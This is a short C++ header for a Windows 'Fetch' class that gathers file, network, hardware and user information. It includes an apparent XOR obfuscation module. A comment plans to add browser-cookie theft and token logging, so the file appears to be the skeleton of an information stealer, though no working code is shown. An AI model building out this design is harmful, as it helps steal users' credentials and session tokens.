#ifndef FILEFETCHER
#define FILEFETCHER
#include <Windows.h>
#include <string>
#include <Psapi.h>
#include "File/File.h"
#include "Network/Network-Info.h"
#include "Hardware/Hardware.h"
#include "User/user.h"
#include "Xor/Xor.h"
class Fetch
{
public:
	
	File file(std::string file_name);

	Network network();

	Hardware hardware();

	User user();

	//need to add stuff for getting webcookies and token logging
private:

};

#endif //FILEFETCHER

